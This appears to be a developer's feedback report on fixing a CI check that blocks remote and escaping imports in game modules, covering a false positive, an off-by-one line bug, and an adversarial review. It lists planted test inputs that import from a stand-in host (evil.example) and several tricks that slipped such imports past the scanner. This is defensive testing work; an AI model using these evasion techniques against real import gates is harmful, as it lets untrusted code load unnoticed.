# PUP-WO-0113 — upward feedback

**Branch `build/wo-0113-check11`, based on `main` at `922bd86` (verified live).**

---

# THE DEFECT, AND WHERE IT ACTUALLY WAS

**`strip()` already existed.** It was already char-for-char, already preserved every
newline, already handled template substitutions with a state machine. **`imports()` simply
never received it.**

The comment above `imports()` said:

> *"Runs on the STRIPPED source for position fidelity but reads the specifier from the raw
> text"*

**a two-source design that was never wired.** `imports(raw)` took one parameter and matched
against it; there was no stripped source inside the function to run on. It has been read as
a description of what the code does for months, by everyone.

## The false positive was three pieces of English, and I supplied one of them

| piece | where it came from |
|---|---|
| `import` | the word **"imports"** in a comment at line 12, from `PUP-WO-0400` |
| `from` | the word **"from"** in a *different* comment ~250 lines later — **mine, `PUP-WO-0704`** |
| `'…'` | a markdown-style backtick pair around a CSS class name, `` `.bp-flash` `` — **also mine** |

Joined by the unbounded `[\s\S]*?`. **The fail-closed gate that northstar invariant 3 rests
on was firing on the word "from".**

**I first reported this as predating PR #68 and that was wrong.** My fixture had #68's
`games/blockpop.js` copied into it by an earlier step and I labelled the next run "main
as-is". Re-run self-contained: `922bd86` clean is GREEN, the same tree with only
`games/blockpop.js` swapped is RED. CC-A's diagnosis was right and mine was contaminated —
*a fixture that carries state from a previous step is not the fixture its label names.*

---

# THE FIX — two sources, each answering only what it can

- **MATCH on `stripped`**, where comments and string bodies are blanks, so no amount of
  prose can spell an import.
- **READ the specifier out of `raw`** at the matched group's own offsets (`d` flag), because
  the stripped text has the quotes but not the characters between them.

`strip()` overwrites with spaces and keeps every newline, so **an index into one is an index
into the other** — position fidelity is a property of the construction rather than of
arithmetic somebody has to keep correct.

**The `[\s\S]*?` gap is not bounded.** It is unbounded deliberately so `import{x}` and a
next-line specifier are both seen, and both evaded the previous line-based detector. **The
defect was never the gap; it was the source being scanned.**

## And it was off by one, which is a second latent defect

`(?:^|[;}\s])` can consume the **newline that ends the previous line**, so `m.index` pointed
one line early for every import that starts a line — which is nearly all of them. Measured,
not reasoned: **the old code reports line 3 for an import on line 4.** The keyword is
captured and reported from now. *(The `import(` form was never affected — its lookbehind is
zero-width. The commit message's first draft claimed both; corrected.)*

---

# §7 — THE ADVERSARIAL PASS, AND THE FOUR FALSE GREENS IT FOUND

**Fresh subagent, `git archive` freeze of `47d9215`, corrections held until it returned.**

**It found that my repair had opened a hole in the gate.** Moving the import scan onto the
stripped source is what stops it reading English — **and it made every `strip()` blind spot
a way for a real remote import to pass.** Each of these is a genuine
`import z from 'https://evil.example/m.js'`, each RED before this work order and GREEN after
my first commit. Reproduced myself before touching anything:

| input | what `strip()` did |
|---|---|
| ``const RE = /`/;`` | the backtick opened a template and blanked to **end of file** |
| `const RE = /[/*]/;` | the `/` `*` pair opened a block comment, likewise |
| `const RE = /'/g;` | the quote opened a string and blanked the rest of the line |
| `// …<U+2028>import` | **U+2028 ends a line comment in JavaScript**; this stopped at `\n` only |

**§3 of the work order is explicit that a gate which passes is worse than one that fires on
prose. I built the second and shipped the first.**

## The limit had to close, not be documented harder

`strip()`'s header called the regex literal a *"KNOWN LIMIT, stated rather than implied"* —
and that was **honest** while the import scan ran on raw, because a blind spot could then
only ever cost a false NOTE. It stopped being honest the moment the scan moved.

**A regex literal is code whose contents are not, which is exactly a string's shape:** keep
the delimiters, blank the body. Line comments now end at all four JavaScript line
terminators. Whether `/` opens a regex or divides is the one thing a lexer cannot decide
locally, and the heuristic is the one this file already used for its own regex note.

## So the stripper now says when it loses its place

The heuristic cannot be right about every `/`, so what matters is what happens when it is
wrong. A string, template, block comment or regex literal that runs to EOF unclosed sets
`.broke`, and **`scanModule` refuses a verdict**. It has already proved the module parses as
an ES module before it strips, so an unterminated anything is impossible in it — **it means
this scanner mis-lexed, and everything after that point was blanked. A blanked file scans
clean.**

Demonstrated on `const x = {} / 2;` — valid JavaScript that the heuristic gets wrong, which
produces a **loud refusal rather than a silent pass.** *(My first two attempts at that
control used files that do not parse, so they went red two branches earlier and proved
nothing about `broke`. That is the whole point of planting.)*

## Three more, each real

- **The regex-literal note is retired and its absence is asserted.** It said *"This scanner
  does not track regex literals … Read this module by eye."* True when written, **false
  after this change** — and a note warning about a hazard that has been closed trains people
  to ignore notes. A gate replaced a request.
- **My new note was baselined wrong and would have been noise forever.** Measured against
  raw, it fires on any module whose *prose* mentions an import — **`games/blockpop.js` would
  have carried it on every green run**, which is the exact failure this file rewrote the
  regex note for. Baselined on `noComments` now: a mention in a comment is silent; something
  that survives comment-removal and then vanishes is not prose. Verified silent on all three
  real modules and on PR #68's head. **It is also no longer truncated at four** — the pass
  built the case where five prose mentions push the one real hidden import off the end of
  the list and every visible entry looks obviously like prose.
- **A relative-looking specifier that escapes `games/` was being cleared.**
  `import z from "./a/../../evil.js"` decodes to `./a/../../evil.js`;
  `im.spec` is raw source text with escapes undecoded, so `isRelative` saw `./` and
  `resolve()` treated the escape as ordinary filename characters. **Refused now** — the same
  answer this check already gives a non-literal dynamic specifier, and for the same reason.

## And one of my own plants was a no-op

*"a real remote import after a STRING containing an apostrophe"* put the apostrophe inside a
**double**-quoted string, which stresses no lexer at all, and parked the import after the
whole body so even end-of-line damage could not reach it. The pass mutated `strip()` to the
exact confusion the label names and **the control stayed green while a different control
caught the mutant.** The apostrophe is the escaped delimiter of its own string now, and the
import is on the next line.

---

# ACCEPTANCE, ITEM BY ITEM

| # | | |
|---|---|---|
| 1 | the fence holds; **`games/blockpop.js` not edited** | `git diff --name-only origin/main` returns the two CI files and nothing else; `games/`, `index.html`, `sw.js`, `manifest.json`, icons all diff to empty |
| 2 | the exact false positive is gone | check 11 GREEN on `3ef3363` with `games/blockpop.js` byte-identical, tested by swapping **only** the repaired check into an archive of that commit |
| 3 | every evasion still caught, planted individually | `import{x}from'y'`, next-line specifier, **bare specifier (new — it had no control of its own)**, bare dynamic, remote URL, escaping relative, subdirectory graph, `.mjs` sibling |
| 4 | a construct in a comment or string is not reported, both ways | the three-piece reproduction, block/line/string forms, **and four real imports standing next to prose built to look like one** |
| 5 | line numbers preserved | pinned to exact `x.js:4 —` and `x.js:3 —`, with the old off-by-one measured |
| 6 | the controls cover every new branch | 75 controls, all as predicted |
| 7 | every demonstration asserts the commit and the failing step | unchanged; both files fail closed without `PUPPAD_SUBJECT` |

---

# STATED LIMITS, NOT FIXED

- **The regex-or-division heuristic is a heuristic.** `}` is in the set after which a `/`
  may begin a regex, so `{} / 2` is mis-lexed — and refused loudly rather than passed. Being
  wrong the other way (`if (x) /re/.test(s)`) leaves a regex body unblanked, which risks a
  false red, not a false green. **Both failure modes are loud. That is the design.**
- **`export {x} from 'https://…'` and `export * from '…'` are not scanned at all.**
  Pre-existing — the before-tree is green on both too, so it is not a regression from this
  repair — but a re-export *is* a module-level network fetch, and the passing banner reads as
  though it covers one. **Flagged rather than fixed: it is a pattern change, and §4 says a
  pattern change must be paired with the evasion it must still catch and proved.** That is
  its own work order.
- **A `//` comment terminated by U+2028 reports the line as `split('\n')` counts it**, which
  is one lower than an editor shows. The finding is correct and located; the line numbering
  is consistent with the rest of the file, and changing it would move every tier finding's
  line number too.
